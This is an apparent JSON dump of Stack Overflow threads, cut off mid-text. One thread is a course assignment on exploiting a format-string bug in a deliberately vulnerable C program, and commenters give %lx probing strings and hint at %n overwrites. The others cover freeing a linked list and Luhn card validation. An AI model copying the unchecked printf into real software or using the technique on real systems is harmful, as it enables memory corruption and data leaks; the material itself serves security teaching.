"profile_image": "https://www.gravatar.com/avatar/a37f6527568735e434d07a2ede342659?s=128&d=identicon&r=PG&f=1", "display_name": "gllwrnce", "link": "https://stackoverflow.com/users/5601195/gllwrnce"}, "edited": false, "score": 0, "creation_date": 1476303782, "post_id": 40006139, "comment_id": 67293365, "body": "Ok so let me see if I got this right: &quot;%1x%1x%1x%1x%1x%1x%1x%1x%1x%1x%1x%1x%UUUUUUUUUUUUUUUUUUUUUU&zwnj;&#8203;&quot; is what you&#39;re telling me to give as input? Is this for the first or second input? Because I do it for both and they still just show up as &quot;U&quot;s in the output."}, {"owner": {"reputation": 1014, "user_id": 6047952, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a56a0a74a9848b8796170a9bce83e9fa?s=128&d=identicon&r=PG", "display_name": "infixed", "link": "https://stackoverflow.com/users/6047952/infixed"}, "edited": false, "score": 0, "creation_date": 1476304243, "post_id": 40006139, "comment_id": 67293599, "body": "That&#39;s a lowercase L for long, not a one.  You should see the actual U&#39;s, but hopefully in the hex part you&#39;ll see 55&#39;s too.  Also ntering 305419896 at the first <code>scanf</code> will read as &quot;12345678&quot; hex inside <code>int_input</code>, which would not only be a marker, but give you a clue to endian-ess"}, {"owner": {"reputation": 59, "user_id": 5601195, "user_type": "registered", "accept_rate": 7, "profile_image": "https://www.gravatar.com/avatar/a37f6527568735e434d07a2ede342659?s=128&d=identicon&r=PG&f=1", "display_name": "gllwrnce", "link": "https://stackoverflow.com/users/5601195/gllwrnce"}, "edited": false, "score": 0, "creation_date": 1476304403, "post_id": 40006139, "comment_id": 67293681, "body": "Alright, so the input at the first one (int_input) will be: &quot;305419896&quot; (i&#39;ve been using 65535 to give back &#39;ffff&#39; so far). After that, it&#39;s a string of &quot;%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx&quot; followed by &quot;UUUUUUUUUU&quot; is what you&#39;re suggesting right? And I&#39;m looking for where the &quot;305419896&quot; shows up as &quot;12345678&quot; right? And then what?"}, {"owner": {"reputation": 1014, "user_id": 6047952, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a56a0a74a9848b8796170a9bce83e9fa?s=128&d=identicon&r=PG", "display_name": "infixed", "link": "https://stackoverflow.com/users/6047952/infixed"}, "edited": false, "score": 0, "creation_date": 1476305432, "post_id": 40006139, "comment_id": 67294235, "body": "You can see how much longer than 100 your format string has to be to reach <code>int_input</code>.  If you clobber those, the pointer in <code>secret</code> will be clobbered, and the &#39;new secret&#39; printf should be something different.  Although it might crash if <code>secret</code> points to invalid memory.  Then you&#39;ll have to play with the format to find a non-crashing ones"}, {"owner": {"reputation": 59, "user_id": 5601195, "user_type": "registered", "accept_rate": 7, "profile_image": "https://www.gravatar.com/avatar/a37f6527568735e434d07a2ede342659?s=128&d=identicon&r=PG&f=1", "display_name": "gllwrnce", "link": "https://stackoverflow.com/users/5601195/gllwrnce"}, "edited": false, "score": 0, "creation_date": 1476305582, "post_id": 40006139, "comment_id": 67294321, "body": "Well if you&#39;re talking about when &quot;12345678&quot; shows up in the output, it comes from about 5 &quot;%lx&quot; from the start. I figured that using a &quot;%n&quot; after it would change the pointer but it&#39;s not so I&#39;m still at a lost for what to do here? What do you mean by &#39;clobbered&#39; exactly?"}, {"owner": {"reputation": 1014, "user_id": 6047952, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a56a0a74a9848b8796170a9bce83e9fa?s=128&d=identicon&r=PG", "display_name": "infixed", "link": "https://stackoverflow.com/users/6047952/infixed"}, "reply_to_user": {"reputation": 59, "user_id": 5601195, "user_type": "registered", "accept_rate": 7, "profile_image": "https://www.gravatar.com/avatar/a37f6527568735e434d07a2ede342659?s=128&d=identicon&r=PG&f=1", "display_name": "gllwrnce", "link": "https://stackoverflow.com/users/5601195/gllwrnce"}, "edited": false, "score": 0, "creation_date": 1476305864, "post_id": 40006139, "comment_id": 67294464, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/125543/discussion-between-infixed-and-gllwrnce\">continue this discussion in chat</a>."}, {"owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "edited": false, "score": 1, "creation_date": 1476312186, "post_id": 40006139, "comment_id": 67297193, "body": "Take a look at what the <code>%n</code> format specifier to printf does...."}], "owner": {"reputation": 59, "user_id": 5601195, "user_type": "registered", "accept_rate": 7, "profile_image": "https://www.gravatar.com/avatar/a37f6527568735e434d07a2ede342659?s=128&d=identicon&r=PG&f=1", "display_name": "gllwrnce", "link": "https://stackoverflow.com/users/5601195/gllwrnce"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 103, "favorite_count": 1, "closed_date": 1476299378, "answer_count": 0, "score": 0, "last_activity_date": 1476299666, "creation_date": 1476297908, "last_edit_date": 1476299666, "question_id": 40006139, "link": "https://stackoverflow.com/questions/40006139/how-to-crash-this-c-program", "closed_reason": "Duplicate", "title": "How to crash this C program?", "body": "<p>Alright, so in a twist a bit different, I need help actually crashing this program. Don't worry, it's an assignment from my professor, though I'm not sure if this is the place to ask this question. He gave us this code to work with and the instruction to both crash it, and cause <code>secret[0]</code> and <code>secret[1]</code> to become modified by giving input for the two <code>scanf</code> functions. I've tried crashing it with different inputs but nothing yet.</p>\n\n<p>(If this is the type of thing not wanted on this site, just let me know and I'll delete this question. Thanks for your time in advance!)</p>\n\n<pre><code>/* vul_prog.c */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define SECRET1 0x44\n#define SECRET2 0x55\n\nint main(int argc, char *argv[])\n{\nchar user_input[100];\nint *secret;\nint int_input;\nint a, b, c, d; /* other variables, not used here.*/\n\n/* The secret value is stored on the heap */\nsecret = (int *) malloc(2*sizeof(int));\n\n/* getting the secret */\nsecret[0] = SECRET1; secret[1] = SECRET2;\n\nprintf(\"The variable secret's address is 0x%8x (on stack)\\n\", (unsigned int)&amp;secret);\nprintf(\"The variable secret's value is 0x%8x (on heap)\\n\", (unsigned int)secret);\nprintf(\"secret[0]'s address is 0x%8x (on heap)\\n\", (unsigned int)&amp;secret[0]);\nprintf(\"secret[1]'s address is 0x%8x (on heap)\\n\", (unsigned int)&amp;secret[1]);\n\nprintf(\"Please enter a decimal integer\\n\");\nscanf(\"%d\", &amp;int_input);  /* getting an input from user */\nprintf(\"Please enter a string\\n\");\nscanf(\"%s\", user_input); /* getting a string from user */\n\n/* Vulnerable place */\nprintf(user_input);\nprintf(\"\\n\");\n\n/* Verify whether your attack is successful */\nprintf(\"The original secrets: 0x%x -- 0x%x\\n\", SECRET1, SECRET2);\nprintf(\"The new secrets:      0x%x -- 0x%x\\n\", secret[0], secret[1]);\nreturn 0;\n}\n</code></pre>\n"}, {"tags": ["c", "function", "linked-list", "free", "double-pointer"], "comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1476298481, "post_id": 40006135, "comment_id": 67290511, "body": "You <i>do</i> have a function that frees the head and all the members.  It&#39;s named <code>main()</code>.  Your question would be clearer, and would provide more traction for answers, if you present something you tried, and that therefore has the form you want, but that isn&#39;t working for you."}, {"owner": {"reputation": 337, "user_id": 1045838, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/bc1a2f02d37063269450ddb6d87d0c31?s=128&d=identicon&r=PG&f=1", "display_name": "skevthedev", "link": "https://stackoverflow.com/users/1045838/skevthedev"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1476300485, "post_id": 40006135, "comment_id": 67291640, "body": "@JohnBollinger THanks! I added the code I want to work above"}], "answers": [{"comments": [{"owner": {"reputation": 337, "user_id": 1045838, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/bc1a2f02d37063269450ddb6d87d0c31?s=128&d=identicon&r=PG&f=1", "display_name": "skevthedev", "link": "https://stackoverflow.com/users/1045838/skevthedev"}, "edited": false, "score": 0, "creation_date": 1476300442, "post_id": 40006314, "comment_id": 67291612, "body": "Thanks @MarcD, I originally tried your suggestions, but this does not work, I added my code to my above thread with a little more info"}, {"owner": {"reputation": 538, "user_id": 6446925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/002a024a3b131e11d71666a47875cc2f?s=128&d=identicon&r=PG&f=1", "display_name": "MarcD", "link": "https://stackoverflow.com/users/6446925/marcd"}, "reply_to_user": {"reputation": 337, "user_id": 1045838, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/bc1a2f02d37063269450ddb6d87d0c31?s=128&d=identicon&r=PG&f=1", "display_name": "skevthedev", "link": "https://stackoverflow.com/users/1045838/skevthedev"}, "edited": false, "score": 0, "creation_date": 1476301480, "post_id": 40006314, "comment_id": 67292148, "body": "I edited my answer to show you what was wrong with the code you tried."}, {"owner": {"reputation": 337, "user_id": 1045838, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/bc1a2f02d37063269450ddb6d87d0c31?s=128&d=identicon&r=PG&f=1", "display_name": "skevthedev", "link": "https://stackoverflow.com/users/1045838/skevthedev"}, "edited": false, "score": 0, "creation_date": 1476303521, "post_id": 40006314, "comment_id": 67293216, "body": "this worked! thanks, the (head != NULL) was just a typo, but the (*head)-&gt;next was the part I was missing, why do you need the parathenses? what exactly is this doing? I was also thinking about setting *head = NULL; before free(*head);. I read that it is a best practice to set the pointer to null before freeing it, would this be correct for my situation as well?"}, {"owner": {"reputation": 538, "user_id": 6446925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/002a024a3b131e11d71666a47875cc2f?s=128&d=identicon&r=PG&f=1", "display_name": "MarcD", "link": "https://stackoverflow.com/users/6446925/marcd"}, "reply_to_user": {"reputation": 337, "user_id": 1045838, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/bc1a2f02d37063269450ddb6d87d0c31?s=128&d=identicon&r=PG&f=1", "display_name": "skevthedev", "link": "https://stackoverflow.com/users/1045838/skevthedev"}, "edited": false, "score": 0, "creation_date": 1476303934, "post_id": 40006314, "comment_id": 67293456, "body": "Don&#39;t set the pointer to NULL before you free it, but after it, otherwise you&#39;re calling free on NULL, which is pointless. (<code>*head</code>) derefences the head pointer (which is a <code>node**</code>) which gives you a <code>node*</code>, which you can then access <code>-&gt;next</code> with. Google operator precedence to find out why. The member access (-&gt;) takes precedence over the dereference (*)."}, {"owner": {"reputation": 337, "user_id": 1045838, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/bc1a2f02d37063269450ddb6d87d0c31?s=128&d=identicon&r=PG&f=1", "display_name": "skevthedev", "link": "https://stackoverflow.com/users/1045838/skevthedev"}, "edited": false, "score": 0, "creation_date": 1476304537, "post_id": 40006314, "comment_id": 67293748, "body": "Thanks, I appreciate the insight!"}], "tags": [], "owner": {"reputation": 538, "user_id": 6446925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/002a024a3b131e11d71666a47875cc2f?s=128&d=identicon&r=PG&f=1", "display_name": "MarcD", "link": "https://stackoverflow.com/users/6446925/marcd"}, "is_accepted": true, "score": 1, "last_activity_date": 1476301445, "last_edit_date": 1476301445, "creation_date": 1476298582, "answer_id": 40006314, "question_id": 40006135, "link": "https://stackoverflow.com/questions/40006135/using-a-function-to-free-a-linked-list-with-double-pointer/40006314#40006314", "title": "Using a function to free a linked list with double pointer", "body": "<p>From your code : </p>\n\n<pre><code>void freeListMembers(struct node *head){\n    while(head-&gt;next != NULL){\n        head-&gt;next = NULL;\n        free(head-&gt;next);  \n    }\n    return;  \n}\n</code></pre>\n\n<p>This is freeing NULL, not your node*.</p>\n\n<p>Freeing the list is as simple as using a temporary pointer to the next node.</p>\n\n<pre><code>while (head) {\n    node* next = head-&gt;next;\n    free(head);\n    head = next;\n}\n</code></pre>\n\n<p>From your edit :</p>\n\n<pre><code>void freeAllListMembers(struct node **head){ \n    while (head != NULL) {\n        struct node *temp = *head-&gt;next;\n        free(*head);\n        *head = temp ;\n    }\n   return;  \n}\n</code></pre>\n\n<p>There are a couple errors with this. It should be <code>while (*head != NULL)</code> and <code>(*head)-&gt;next</code>. The first is a logic error, because head will always be non-NULL, and the second is a syntax error, because you need to dereference the head pointer before accessing the next pointer.</p>\n"}, {"comments": [{"owner": {"reputation": 538, "user_id": 6446925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/002a024a3b131e11d71666a47875cc2f?s=128&d=identicon&r=PG&f=1", "display_name": "MarcD", "link": "https://stackoverflow.com/users/6446925/marcd"}, "edited": false, "score": 0, "creation_date": 1476301578, "post_id": 40006831, "comment_id": 67292205, "body": "This is not a very clear or concise way to free the list. It works, but in a very roundabout way."}, {"owner": {"reputation": 31, "user_id": 6942044, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-2tSorn6-1kw/AAAAAAAAAAI/AAAAAAAAAJ8/jnc6d0i3zKE/photo.jpg?sz=128", "display_name": "ARVINDER SINGH", "link": "https://stackoverflow.com/users/6942044/arvinder-singh"}, "reply_to_user": {"reputation": 538, "user_id": 6446925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/002a024a3b131e11d71666a47875cc2f?s=128&d=identicon&r=PG&f=1", "display_name": "MarcD", "link": "https://stackoverflow.com/users/6446925/marcd"}, "edited": false, "score": 0, "creation_date": 1476424958, "post_id": 40006831, "comment_id": 67348365, "body": "I agree. But I tried modifying as per thinking of the person who asked the question. So that he may know what he was doing."}], "tags": [], "owner": {"reputation": 31, "user_id": 6942044, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-2tSorn6-1kw/AAAAAAAAAAI/AAAAAAAAAJ8/jnc6d0i3zKE/photo.jpg?sz=128", "display_name": "ARVINDER SINGH", "link": "https://stackoverflow.com/users/6942044/arvinder-singh"}, "is_accepted": false, "score": 0, "last_activity_date": 1476300504, "creation_date": 1476300504, "answer_id": 40006831, "question_id": 40006135, "link": "https://stackoverflow.com/questions/40006135/using-a-function-to-free-a-linked-list-with-double-pointer/40006831#40006831", "title": "Using a function to free a linked list with double pointer", "body": "<p>This will work. You just set next of head to null and freed head. Now we can not move to second element.So we wont be able to free the nodes.Also check base condition. I hope it helps</p>\n\n<pre><code>void freeListmembers(node *head){\nnode *temp=head;\nif(head==NULL)//Base condition\nreturn;\nwhile(head-&gt;next!=NULL){\ntemp=head;//Moved temp to head. we will move head to next and free the previous node\nhead=head-&gt;next;\nfree(temp);\n}\nfree(head);\nreturn;\n</code></pre>\n\n<p>}</p>\n"}], "owner": {"reputation": 337, "user_id": 1045838, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/bc1a2f02d37063269450ddb6d87d0c31?s=128&d=identicon&r=PG&f=1", "display_name": "skevthedev", "link": "https://stackoverflow.com/users/1045838/skevthedev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1336, "favorite_count": 0, "accepted_answer_id": 40006314, "answer_count": 2, "score": 0, "last_activity_date": 1476301445, "creation_date": 1476297904, "last_edit_date": 1476300370, "question_id": 40006135, "link": "https://stackoverflow.com/questions/40006135/using-a-function-to-free-a-linked-list-with-double-pointer", "title": "Using a function to free a linked list with double pointer", "body": "<p>I am having a tough time deleting all members in a linked in a single function. If I break it up like you see below, it works fine, but this seems wildly inefficient and want to figure out the correct way to do this. in order to free all nodes I need to have function to first free all nodes other then the head, then have a function free the head link. this seems like it would be easy to do but I am having trouble.</p>\n\n<p>Thanks for the help!</p>\n\n<pre><code>int main() {\n\n    struct node *head = NULL;\n    createList(&amp;head);\n\n    //do stuff with list\n\n    freeListMembers(head);\n    freeListHead(&amp;head);\n\n    return 0;\n}\n\nint createList(struct node **head) {\n    //create list\n    return 0;\n}\n\nvoid freeListMembers(struct node *head){\n    while(head-&gt;next != NULL){\n        head-&gt;next = NULL;\n        free(head-&gt;next);  \n    }\n    return;  \n}\n\nvoid freeListHead(struct node **head) {\n    *head = NULL;\n    free(*head); \n    return;\n}\n</code></pre>\n\n<p>here is the code that I want to work but does not. the issue I am seeing is a an error for \"*head->next;\" where it sais \"expression must have pointer to struct or union type\"</p>\n\n<pre><code>int main() {\n\n    struct node *head = NULL;\n    createList(&amp;head);\n\n    //do stuff with list\n\n    freeAllListMembers(&amp;head);\n\n    return 0;\n}\n\nint createList(struct node **head) {\n    //create list\n    return 0;\n}\n\nvoid freeAllListMembers(struct node **head){ \n    while (head != NULL) {\n        struct node *temp = *head-&gt;next;\n        free(*head);\n        *head = temp ;\n    }\n   return;  \n}\n</code></pre>\n"}, {"tags": ["c", "algorithm", "cs50", "luhn"], "comments": [{"owner": {"reputation": 1119, "user_id": 5046042, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lo5M0.jpg?s=128&g=1", "display_name": "galfisher", "link": "https://stackoverflow.com/users/5046042/galfisher"}, "edited": false, "score": 2, "creation_date": 1476297529, "post_id": 40005990, "comment_id": 67289948, "body": "You used a <code>break</code> inside a <code>while</code> with no condition to that break. It will happen every time. So your while loop won&#39;t loop more than at most 1."}, {"owner": {"reputation": 1119, "user_id": 5046042, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lo5M0.jpg?s=128&g=1", "display_name": "galfisher", "link": "https://stackoverflow.com/users/5046042/galfisher"}, "edited": false, "score": 0, "creation_date": 1476297593, "post_id": 40005990, "comment_id": 67289978, "body": "Where is the implementation of <code>GetLongLong()</code> ?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1476297929, "post_id": 40005990, "comment_id": 67290174, "body": "It might be easier to input the card number as a string instead of converting the input to a number, and then (effectively) back to a string to examine each digit. Perhaps various fields within the &quot;long card number&quot; will need converting to binary numbers at some stage, I suggest later, when you can more easily extract those fields from a string."}, {"owner": {"reputation": 21, "user_id": 7009557, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/E39o2.jpg?s=128&g=1", "display_name": "Mynah", "link": "https://stackoverflow.com/users/7009557/mynah"}, "reply_to_user": {"reputation": 1119, "user_id": 5046042, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lo5M0.jpg?s=128&g=1", "display_name": "galfisher", "link": "https://stackoverflow.com/users/5046042/galfisher"}, "edited": false, "score": 0, "creation_date": 1476299708, "post_id": 40005990, "comment_id": 67291218, "body": "@galfisher From what I understand, GetLongLong() is part of CS50.h . Thanks a lot for the input, will correct the &quot;break&quot; issue, I did that because otherwise I wasn&#39;t managing to get any return form the program so I thought I would try this and see. But now I understand that I doesn&#39;t solve anything at all."}, {"owner": {"reputation": 21, "user_id": 7009557, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/E39o2.jpg?s=128&g=1", "display_name": "Mynah", "link": "https://stackoverflow.com/users/7009557/mynah"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1476300191, "post_id": 40005990, "comment_id": 67291471, "body": "@WeatherVane My assignment specifically asks to get a long long variable from the user... At first I tried to convert the long long into an array and then splitting the array into 2 arrays to apply the algorithm but I just couldn&#39;t figure out how to do it."}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 7009557, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/E39o2.jpg?s=128&g=1", "display_name": "Mynah", "link": "https://stackoverflow.com/users/7009557/mynah"}, "edited": false, "score": 0, "creation_date": 1476323613, "post_id": 40009026, "comment_id": 67300024, "body": "wow, this is very helpful. I actually re-worked on the code after posting and got rid of the breaks and the returns but didn&#39;t see any change in how the program was behaving and couldn&#39;t understand what was wrong in the loops. Will revise and correct. Thank you for taking the time to explain."}], "tags": [], "owner": {"reputation": 32921, "user_id": 5771269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be6a5b618f5bd197150a6186318beba7?s=128&d=identicon&r=PG&f=1", "display_name": "cdlane", "link": "https://stackoverflow.com/users/5771269/cdlane"}, "is_accepted": true, "score": 2, "last_activity_date": 1476309332, "creation_date": 1476309332, "answer_id": 40009026, "question_id": 40005990, "link": "https://stackoverflow.com/questions/40005990/write-a-program-in-c-to-apply-luhns-algorithm-for-credit-card-validation/40009026#40009026", "title": "Write a program in C to apply Luhn&#39;s algorithm for credit card validation", "body": "<p>Your answer is a out of order pastiche with sections that don't follow logically from the previous.</p>\n\n<p>Specific issues:</p>\n\n<p>This logic:</p>\n\n<pre><code>if (count != 13 || count != 15 || count != 16)\n</code></pre>\n\n<p>invalidates every card, the <strong>or</strong>s (||) should be <strong>and</strong>s (&amp;&amp;) for this to work.</p>\n\n<p>This loop makes no sense:</p>\n\n<pre><code>while (card_num &gt;= 0)\n{\n    digit = card_num % 10 ;\n    count++ ;\n    temp_num = (card_num - digit) / 10 ;\n    break ;\n    ...\n}\n</code></pre>\n\n<p>The <code>break</code> is unconditional so it exits the loop and ignores the next twenty lines.</p>\n\n<p>You appear to have spliced in subroutines from elsewhere as you call <code>return</code> five times, only the last of which is valid:</p>\n\n<pre><code>return sum_a ;\nreturn sum_b ;\nreturn count ;\nreturn company_id ;\nreturn 0 ;\n</code></pre>\n\n<p>In several places you use <code>card_num</code> when you should be using <code>temp_num</code>.</p>\n\n<p>You fail to exit the program once you know the card is invalid -- instead you just keep on testing.  You fail to acknowledge when a card is valid.</p>\n\n<p>You count the number of digits in the card number but wait until after you run other checks before testing if that digit count was valid or not.</p>\n\n<p>What follows is my rework of your code to address the above and some style issues:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;cs50.h&gt;\n#include &lt;math.h&gt;\n\nint main(void)\n{\n    printf(\"Please give me your credit card number: \") ;\n\n    long long card_num = 0LL;\n\n    while (card_num &lt; 1LL || card_num &gt; 9999999999999999LL)\n    {\n        card_num = GetLongLong();\n    }\n\n    // Make a copy of the card number to be used and modified throughout the process.\n\n    long long temp_num = card_num;\n\n    // Isolate every digit from the credit card number using a loop and the variable 'digit'.\n    // Keep track of the amount and position of each digit using variable 'count'.\n\n    int count = 0;\n\n    while (temp_num &gt; 0LL)\n    {\n        temp_num = temp_num / 10LL;\n        count++;\n    }\n\n    // If the number entered doesn't have the right amount of digits according\n    // to variable 'count', declare the number as invalid.\n\n    if (count != 13 &amp;&amp; count != 15 &amp;&amp; count != 16)\n    {\n        printf(\"This is an invalid number (# of digits).\\n\");\n        return 1;\n    }\n\n    // Reset value of variable 'temp_num' and apply calculations that will isolate the first two digits. \n    // Store the results in a variable 'company_id'.\n\n    temp_num = card_num;\n\n    while (temp_num &gt; 100LL)\n    {\n        temp_num = temp_num / 10LL;\n    }\n\n    int company_id = temp_num;\n\n    // Print the type of credit card depending on the company ID and amount of digits.\n\n    if (company_id &gt; 50 &amp;&amp; company_id &lt; 56 &amp;&amp; count == 16)\n    {\n        printf(\"MASTERCARD\\n\") ;\n    }\n    else if ((company_id == 34 || company_id == 37) &amp;&amp; (count == 15)) \n    {\n        printf(\"AMEX\\n\") ;\n    }\n    else if ((company_id / 10 == 4) &amp;&amp; (count == 13 || count == 16 || count == 19))\n    {\n        printf(\"VISA\\n\") ;\n    }\n    else\n    {\n        printf(\"This card was issued by an unknown company.\\n\");\n    }\n\n    // Apply Luhn's algorithm.\n\n    int sum = 0;\n\n    temp_num = card_num;\n\n    for (int i = 1; i &lt;= count; i++)\n    {\n        int digit = temp_num % 10LL;\n\n        if (i % 2 == 0)\n        {\n            digit *= 2;\n\n            if (digit &gt; 9)\n            {\n                digit -= 9;\n            }\n        }\n\n        sum += digit;\n\n        temp_num /= 10LL;\n    }\n\n    // Checking the validity of the number according to Luhn's algorithm\n\n    if (sum % 10 != 0)\n    {\n        printf(\"This is an invalid number (Luhn's algorithm).\\n\");\n        return 1; \n    }\n\n    printf(\"This is a valid number.\\n\");\n\n    return 0;\n} \n</code></pre>\n\n<p>This is not a finished program -- there's error checking and other details needed.  Rather than summing the digits when a doubled card number is greater than 9, I used the simpler approach of subtracting 9.</p>\n"}, {"tags": [], "owner": {"reputation": 21, "user_id": 11725913, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-YWJpqUG5CMM/AAAAAAAAAAI/AAAAAAAAAtU/mMwc63VYQEA/photo.jpg?sz=128", "display_name": "SergioRicardo GR", "link": "https://stackoverflow.com/users/11725913/sergioricardo-gr"}, "is_accepted": false, "score": 2, "last_activity_date": 1569390450, "creation_date": 1569390450, "answer_id": 58091850, "question_id": 40005990, "link": "https://stackoverflow.com/questions/40005990/write-a-program-in-c-to-apply-luhns-algorithm-for-credit-card-validation/58091850#58091850", "title": "Write a program in C to apply Luhn&#39;s algorithm for credit card validation", "body": "<p>Here my solution, this method received the var long credit card number, I hope to be helpful.</p>\n\n<pre><code>void check_card(long n)\n\n{\n    long temp_n = n;\n    int count = 2;\n    while(temp_n &gt; 100)\n    {\n        temp_n = temp_n / 10;\n        count ++;\n    }\n\n    long temp_n2 = n;\n    int sum = 0;\n\n    for (int i = 1; i &lt;= count; i++)\n    {\n        int digit = temp_n2 % 10;\n        if (i%2 == 0)\n        {\n            if (digit * 2 &gt; 9)\n            {\n                sum += (digit * 2) - 9;\n            }\n            else\n            {\n                sum += digit * 2;\n            }\n        }\n        else\n        {\n             sum += digit;\n        }  \n        temp_n2 /= 10;\n    }\n\n    bool flag = (sum % 10 == 0) ? true : false;\n\n    if (count == 15 &amp;&amp; (temp_n == 34 || temp_n == 37) &amp;&amp; flag)\n    {\n        printf(\"AMEX\\n\");\n    }\n    else if(count == 16 &amp;&amp; (temp_n &gt; 50 &amp;&amp; temp_n &lt; 56) &amp;&amp; flag)\n    {\n        printf(\"MASTERCARD\\n\");\n    }\n    else if((count == 13 || count == 16) &amp;&amp; (temp_n / 10 ==4) &amp;&amp; flag)\n    {\n        printf(\"VISA\\n\");\n    }\n    else\n    {\n        printf(\"INVALID\\n\");\n    }        \n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 7009557, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/E39o2.jpg?s=128&g=1", "display_name": "Mynah", "link": "https://stackoverflow.com/users/7009557/mynah"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 17736, "favorite_count": 2, "accepted_answer_id": 40009026, "answer_count": 2, "score": 0, "last_activity_date": 1569390450, "creation_date": 1476297412, "question_id": 40005990, "link": "https://stackoverflow.com/questions/40005990/write-a-program-in-c-to-apply-luhns-algorithm-for-credit-card-validation", "title": "Write a program in C to apply Luhn&#39;s algorithm for credit card validation", "body": "<p>I am completely new to C (and all forms of programing...) and following the CS50 class this year. I'm having a really hard time with writing a simple program that uses Luhn's algorithm to test the validity of credit card numbers. </p>\n\n<p>I need my program to prompt a user for an input and re-prompt in case the input doesn't follow a credit card format (ex: negative numbers or letters, etc...) and then apply the algorithm to see if the number is a valid credit card number and if yes, whether it's Visa, MasterCard or AmEx. </p>\n\n<p>I know that this question has been answered with different codes on this website, I swear I read everything that I could possibly find (on this site and elsewhere on the net) but I'm having a really hard time understanding the C syntax and I wanted to try to come up with something myself instead of copying bits of codes I don't understand from other answers. If someone can help me out and look at what I've done so far and tell me what I'm doing wrong I would be really grateful. Also, any tips that could help me make sense of the C syntax logic better would be extremely appreciated, again I'm a totally and utter newbie (3 weeks into studying programming on a self-paced basis...) .</p>\n\n<p>My program is compiling but when I run it it's acting up in a very weird way: when I enter an input sometimes it will say that it is invalid (even if it's a valid number) and sometimes it will just not return anything after I press enter and won't stop running no matter how many times I press the return key. </p>\n\n<p>Here is my code so far:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;cs50.h&gt;\n#include &lt;math.h&gt;\n\nint main(void)\n{\n    printf(\"Please give me your credit card number:\\n\") ;\n\n    long long card_num ;\n\n    do\n    {\n        card_num = GetLongLong() ;\n    }\n    while (card_num &lt; 1 || card_num &gt; 9999999999999999) ;\n\n    // Make a copy of the card number to be used and modified throughout the process.\n\n    long long temp_num = card_num ;\n    int digit = 0 ;\n    int count = 0 ;\n    int sum_a = 0 ;\n    int sum_b = 0 ;\n\n    // Isolate every digit from the credit card number using a loop and the variable 'digit'.\n    // Keep track of the amount and position of each digit using variable 'count'.\n\n    while (card_num &gt;= 0)\n    {\n        digit = card_num % 10 ;\n        count++ ;\n        temp_num = (card_num - digit) / 10 ;\n        break ;\n\n\n     // Apply Luhn's algorithm using two different 'for' loops depending on the position of each digit.\n\n        for (count = 0 ; count % 2 == 0 ; count++)\n        {\n            sum_a = sum_a + ((card_num % 10) * 2) ;\n\n            while ((card_num % 10) * 2 &gt;= 10)\n            {\n                sum_a = (sum_a % 10) + 1 ;\n            } \n        }\n\n        for (count = 0 ; count % 2 != 0 ; count++)\n        {\n            sum_b = 